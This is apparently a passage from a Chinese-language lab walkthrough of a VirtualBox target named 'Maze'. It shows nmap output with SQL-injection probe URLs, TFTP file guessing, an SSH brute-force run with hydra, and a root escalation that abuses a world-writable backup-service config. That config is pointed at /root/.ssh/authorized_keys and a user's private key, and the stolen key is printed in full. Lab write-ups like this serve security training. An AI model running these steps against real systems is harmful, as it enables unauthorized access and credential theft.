class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=M%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/responsive-overlays/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/responsive-overlays/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/responsive-overlays/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/responsive-overlays/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=D%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/debugger/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/debugger/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/debugger/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/debugger/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/?C=M%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.5:80/system/assets/jquery/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|_    http://192.168.2.5:80/system/assets/jquery/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-fileupload-exploiter: <br>|   <br>|     Couldn<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|_    Couldn&#x27;</span>t find a file-type field.<br>| http-internal-ip-disclosure: <br>|_  Internal IP Leaked: 127.0.1.1<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /backup/: Backup folder w/ directory listing</span><br><span class="hljs-string">|   /logs/: Logs</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /bin/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.62 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /cache/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.62 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.62 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /system/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.62 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /tmp/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.62 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /user/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.62 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /vendor/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.62 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">MAC Address: 08:00:27:EF:3E:9E (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 45.92 seconds</span><br></code></pre></td></tr></table></figure><p>找到可能存在<code>sql注入</code>以及一些目录</p><h1 id="二、渗透测试"><a href="#二、渗透测试" class="headerlink" title="二、渗透测试"></a>二、渗透测试</h1><h2 id="1、WEB渗透"><a href="#1、WEB渗透" class="headerlink" title="1、WEB渗透"></a>1、WEB渗透</h2><p>访问80端口，发现是靶场的介绍页面，经过查看发现cms是<code>Grav 1.7.48</code>，查看发现该版本存在RCE漏洞，但是需要登录权限，而admin登录页面访问发现不存在，因此该攻击路径不可行。</p><h2 id="2、TFTP渗透"><a href="#2、TFTP渗透" class="headerlink" title="2、TFTP渗透"></a>2、TFTP渗透</h2><p>直接连接该服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# tftp 192.168.2.5        <br>tftp&gt;<br></code></pre></td></tr></table></figure><p>成功连接，但是TFTP 不提供目录列表</p><p>尝试枚举常见的文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# tftp 192.168.2.5<br>tftp&gt; get <span class="hljs-built_in">id</span><br>Error code 1: File not found<br>tftp&gt; get user<br>Error code 1: File not found<br>tftp&gt; get user.txt<br>tftp&gt;<br></code></pre></td></tr></table></figure><p>成功获取到<code>user.txt</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> user.txt     <br>flag&#123;user-4e79af9d9b43464228ae1100839a2575&#125;<br>username:bamuwe<br>need:bruteforce<br></code></pre></td></tr></table></figure><p>提示需要暴力破解</p><h1 id="三、SSH暴力破解"><a href="#三、SSH暴力破解" class="headerlink" title="三、SSH暴力破解"></a>三、SSH暴力破解</h1><p>使用<code>hydra</code>对用户<code>bamuwe</code>进行暴力破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# hydra -t 64 -l bamuwe -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.5 -F -I<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 15:22:29<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task<br>[DATA] attacking ssh://192.168.2.5:22/<br>[22][ssh] host: 192.168.2.5   login: bamuwe   password: hahaha<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.5 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 15:23:23<br></code></pre></td></tr></table></figure><p>找到密码：<code>hahaha</code></p><p>进行连接，获取shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh bamuwe@192.168.2.5                       <br>bamuwe@Maze:~$ <span class="hljs-built_in">id</span><br>uid=1005(bamuwe) gid=1005(bamuwe) <span class="hljs-built_in">groups</span>=1005(bamuwe)<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><p>在<code>/opt</code>目录下发现关键服务脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bamuwe@Maze:/opt$ <span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x  2 root root 4096 Aug 15 08:07 .<br>drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..<br>-rw-r--r--  1 root root 2524 Aug 15 08:07 log_backup_service.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python">bamuwe@Maze:/opt$ cat log_backup_service.py <br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br>logging.basicConfig(<br>    filename=<span class="hljs-string">&#x27;/var/log/log_backup_service.log&#x27;</span>,<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span><br>)<br><br>CONFIG_PATH = <span class="hljs-string">&#x27;/etc/log_backup_service/config.json&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_directory_as_root</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>        logging.info(<span class="hljs-string">f&quot;Directory <span class="hljs-subst">&#123;path&#125;</span> does not exist, creating it now.&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            os.makedirs(path)<br>            logging.info(<span class="hljs-string">f&quot;Successfully created directory: <span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logging.error(<span class="hljs-string">f&quot;Failed to create directory <span class="hljs-subst">&#123;path&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backup_logs</span>(<span class="hljs-params">config</span>):<br>    source_log = config.get(<span class="hljs-string">&quot;source_log_path&quot;</span>)<br>    backup_dest = config.get(<span class="hljs-string">&quot;backup_dest&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_log <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> backup_dest:<br>        logging.error(<span class="hljs-string">&quot;Configuration is missing &#x27;source_log_path&#x27; or &#x27;backup_dest&#x27;.&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> create_directory_as_root(backup_dest):<br>        logging.error(<span class="hljs-string">&quot;Failed to create backup destination directory. Aborting.&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    run_as_user = config.get(<span class="hljs-string">&quot;run_as_user&quot;</span>, <span class="hljs-string">&quot;nobody&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        logging.info(<span class="hljs-string">f&quot;Attempting to switch user to <span class="hljs-subst">&#123;run_as_user&#125;</span>...&quot;</span>)<br>        os.chown(backup_dest, os.getuid(), os.getgid())<br>        logging.info(<span class="hljs-string">&quot;User switch simulated. Performing backup.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logging.warning(<span class="hljs-string">f&quot;Failed to switch user to <span class="hljs-subst">&#123;run_as_user&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>. Continuing as current user (root).&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        timestamp = datetime.now().strftime(<span class="hljs-string">&quot;%Y%m%d%H%M%S&quot;</span>)<br>        backup_filename = os.path.basename(source_log)<br>        archive_path = os.path.join(backup_dest, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;backup_filename&#125;</span>.<span class="hljs-subst">&#123;timestamp&#125;</span>.bak&quot;</span>)<br><br>        shutil.copyfile(source_log, archive_path)<br>        logging.info(<span class="hljs-string">f&quot;Backup successful: <span class="hljs-subst">&#123;source_log&#125;</span> -&gt; <span class="hljs-subst">&#123;archive_path&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logging.error(<span class="hljs-string">f&quot;Backup failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(CONFIG_PATH, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                config = json.load(f)<br>            backup_logs(config)<br>        <span class="hljs-keyword">except</span> FileNotFoundError:<br>            logging.error(<span class="hljs-string">f&quot;Configuration file not found at <span class="hljs-subst">&#123;CONFIG_PATH&#125;</span>. Skipping backup.&quot;</span>)<br>        <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>            logging.error(<span class="hljs-string">f&quot;Failed to parse JSON from <span class="hljs-subst">&#123;CONFIG_PATH&#125;</span>. Check file format.&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logging.error(<span class="hljs-string">f&quot;An unexpected error occurred: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>        time.sleep(<span class="hljs-number">60</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>这是一个以root权限运行的<strong>日志备份守护进程</strong>，主要功能包括：</p><ul><li>定期备份指定路径的日志文件</li><li>支持配置文件管理，路径：<code>/etc/log_backup_service/config.json</code></li><li>自动创建备份目录</li><li>记录操作日志</li><li>模拟用户权限切换</li></ul><p>查看配置文件权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bamuwe@Maze:/opt$ <span class="hljs-built_in">ls</span> -al /etc/log_backup_service/config.json<br>-rwxrwxrwx 1 root root 113 Aug 15 08:08 /etc/log_backup_service/config.json<br></code></pre></td></tr></table></figure><p>发现具有写入权限</p><h2 id="1、读取root的公钥"><a href="#1、读取root的公钥" class="headerlink" title="1、读取root的公钥"></a>1、读取root的公钥</h2><p>修改配置文件里面的路径，将root下面的公钥自动备份到<code>/tmp</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;source_log_path&quot;</span>: <span class="hljs-string">&quot;/root/.ssh/authorized_keys&quot;</span>,<br>  <span class="hljs-string">&quot;backup_dest&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span>,<br>  <span class="hljs-string">&quot;run_as_user&quot;</span>: <span class="hljs-string">&quot;root&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>成功获取到root的公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bamuwe@Maze:/tmp$ <span class="hljs-built_in">cat</span> authorized_keys.20250908033621.bak <br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnxsglQGkTg9RmRrpKDmp3NIRcLhx98uHQJSjhJo7OqXsXbQAJtx5BMfcHGemYBiSPCIt+6Ktqabuor84EI1R+bgTKrLgOnEsfQiXlW3kHu533YDNGU/H2Kk1ADi3w0m/bjjlF+vOqUTY11Z3eadIA/yGdOlEwSfu6xUh1RxqjQmBIcIY5fwIW8HO74l3wnl824RirQyjf5LR1ZhHxXg0jAOA/2XZ/vWGwregQGhhVzqQv1ofgjqVRshJPkEJu1pfDFIopJsYIVzSrzsmwiznPOXIvPmQLzdoVFRhmQsI14L4TZNLdAqe7GxBussP/yAPi/Boj2jpHUfb0Skh9kvtpJwTjN4zko9AhSKhuwJlEQyos0Hn9Cvny3/H+nPvVLOGhlQG/gxhZQ34d7Efm5Qm3eD96Tu1qKu3vUU/yZxjMWFpFW/r0gl0QB1MY5AN8ZYCIijGPOMw5F4B9rv0Hp1anMA2WOisxjeESCPfAWqjWHtgmOKOSCf9hw7WmXtH4BG8= ll104567@Maze<br></code></pre></td></tr></table></figure><p>发现私钥存在于<code>ll104567</code>，<code>rsa</code>加密</p><h2 id="2、读取root的私钥"><a href="#2、读取root的私钥" class="headerlink" title="2、读取root的私钥"></a>2、读取root的私钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;source_log_path&quot;</span>: <span class="hljs-string">&quot;/home/ll104567/.ssh/id_rsa&quot;</span>,<br>  <span class="hljs-string">&quot;backup_dest&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span>,<br>  <span class="hljs-string">&quot;run_as_user&quot;</span>: <span class="hljs-string">&quot;root&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>成功读取到私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">bamuwe@Maze:/tmp$ <span class="hljs-built_in">cat</span> id_rsa.20250908033921.bak <br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEA58bIJUBpE4PUZka6Sg5qdzSEXC4cffLh0CUo4SaOzql7F20ACbce<br>QTH3BxnpmAYkjwiLfuiramm7qK/OBCNUfm4Eyqy4DpxLH0Il5Vt5B7ud92AzRlPx9ipNQA<br>4t8NJv2445RfrzqlE2NdWd3mnSAP8hnTpRMEn7usVIdUcao0JgSHCGOX8CFvBzu+Jd8J5f<br>NuEYq0Mo3+S0dWYR8V4NIwDgP9l2f71hsK3oEBoYVc6kL9aH4I6lUbIST5BCbtaXwxSKKS<br>bGCFc0q87JsIs5zzlyLz5kC83aFRUYZkLCNeC+E2TS3QKnuxsQbrLD/8gD4vwaI9o6R1H2<br>9EpIfZL7aScE4zeM5KPQIUiobsCZREMqLNB5/Qr58t/x/pz71SzhoZUBv4MYWUN+HexH5u<br>UJt3g/ek7tairt71FP8mcYzFhaRVv69IJdEAdTGOQDfGWAiIoxjzjMOReAfa79B6dWpzAN<br>ljorMY3hEgj3wFqo1h7YJjijkgn/YcO1pl7R+ARvAAAFiDyHXyk8h18pAAAAB3NzaC1yc2<br>EAAAGBAOfGyCVAaROD1GZGukoOanc0hFwuHH3y4dAlKOEmjs6pexdtAAm3HkEx9wcZ6ZgG<br>JI8Ii37oq2ppu6ivzgQjVH5uBMqsuA6cSx9CJeVbeQe7nfdgM0ZT8fYqTUAOLfDSb9uOOU<br>X686pRNjXVnd5p0gD/IZ06UTBJ+7rFSHVHGqNCYEhwhjl/Ahbwc7viXfCeXzbhGKtDKN/k<br>tHVmEfFeDSMA4D/Zdn+9YbCt6BAaGFXOpC/Wh+COpVGyEk+QQm7Wl8MUiikmxghXNKvOyb<br>CLOc85ci8+ZAvN2hUVGGZCwjXgvhNk0t0Cp7sbEG6yw//IA+L8GiPaOkdR9vRKSH2S+2kn<br>BOM3jOSj0CFIqG7AmURDKizQef0K+fLf8f6c+9Us4aGVAb+DGFlDfh3sR+blCbd4P3pO7W<br>oq7e9RT/JnGMxYWkVb+vSCXRAHUxjkA3xlgIiKMY84zDkXgH2u/QenVqcwDZY6KzGN4RII<br>98BaqNYe2CY4o5IJ/2HDtaZe0fgEbwAAAAMBAAEAAAGAAnNqqGIu+kLZmx9CVwgh/hKzF5<br>pxOK+5zY6nCQJ0XiESqSPA7VlfW4cgupV+j9n4xv5rIzNopJ5rmpQJVKfe+9tD97St2ZGz<br>hagYaH14ISnNuNDumd7HXzgBSx0bRUGkZyjw2BmYPAPR0+3nVnO+Ab6w5023kBAoNkhhxM<br>O0t2c7R2jRMohySDXQs3roTWQPU7A7p4v1QbDUa61hoTDCaM1YkbRF+YHSJ6EfJBRyj224<br>9LyLAUfg3aVJZkf7O9rPCN00pKWV3dFy1MxB21gCXyOXbLKBAycgp+Re+4Zmd3bu2pXRCM<br>lkjBIPfD/IUC9E1ASUVSjjSGSulp2QQ82PY9xwKyFDQpEuxk4aGHqj9dRwZ6lVAvSRmmeL<br>9qvsHIfp7snmHufw9pRkVJTLYJk5MG3QkaEmr/adIuIXBuRKCkFV8YBBIfX/6nbpcdbDSN<br>LVi1LnPs8kAd1PKqYeQs3uPm5jQl5B5XfxSfN1c/JSsIAPeOzYw01vrqL4d3y84eV5AAAA<br>wA/bwcCnZrEJgN2WCXCOPP2eaC1bcHcJW8deqhm9YX/kytg832aEf86o5mX+QM3jEQPR9t<br>jLkTumR5F3MhlhaKYtNl+9g7EdVq3VFSGkPraEUR4fKF5+W2mVef2F7kFqKqRTp0hk/g2G<br>6BE7ZICsJn7pBqJH27YtnOFNJi3TaPG5T0gC1aJiV+CuAeykyk4P3MA7tjbwu9Nd+1+/4o<br>4zqqMy8eOsAApIxUAiJHSefkX32AwPGkCo+uklLeA+5UeHAAAAAMEA9b191VDyV4jseqFc<br>fDd+ysipFobuPGHtUDtZvaoYA8zfbKGmAYnsQ123L/fwidWrMaLC78s2BPAtQdhsNyLNvD<br>69fOiVuxQy4/sSdbL96y02QnZDjh3n4pzKpskNV9+QxSEcqCpig9sZPNELKT4NuS7lK36E<br>2DpCDnkVkZtilyeta6ln4TLntoRrXY/4/DbdBXYJl+HB6t6EivkolgBEV4a+uL3tu1qtY0<br>nwA2DNyzClte61P1OXKXUeX8FMtkbbAAAAwQDxdAtGFSzwOkdcvCVRML3q9wq+m34QYsKm<br>LgQlUKIeWfCPnIcjt8ceHkwzjHE10vEnCihihc17pz5R+RutkVqWb9dCUQmyFBsHC67gxQ<br>pdvZPVBhu6z0/DvUq5w2Nsq1f9ZGnH5pyFfAGEtUu9zL4PpbSmGRCbzYpyrWjuKZEQ2Wvl<br>E36trJhFoH3NuNgLZ8LadpPwjE2JNgR1vrqdLAprgMmZUsTENGZUtCsNOGuL8kVIpOuuny<br>PaPHOkvScxWv0AAAANbGwxMDQ1NjdATWF6ZQECAwQFBg==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><h2 id="3、获取root的shell"><a href="#3、获取root的shell" class="headerlink" title="3、获取root的shell"></a>3、获取root的shell</h2><p>根据获取到的私钥，成功进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">bamuwe@Maze:/tmp$ <span class="hljs-built_in">cat</span> id_rsa.20250908033921.bak  &gt; <span class="hljs-built_in">id</span><br>bamuwe@Maze:/tmp$ <span class="hljs-built_in">chmod</span> 600 <span class="hljs-built_in">id</span><br>bamuwe@Maze:/tmp$ ssh root@localhost -i <span class="hljs-built_in">id</span><br>...<br>root@Maze:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 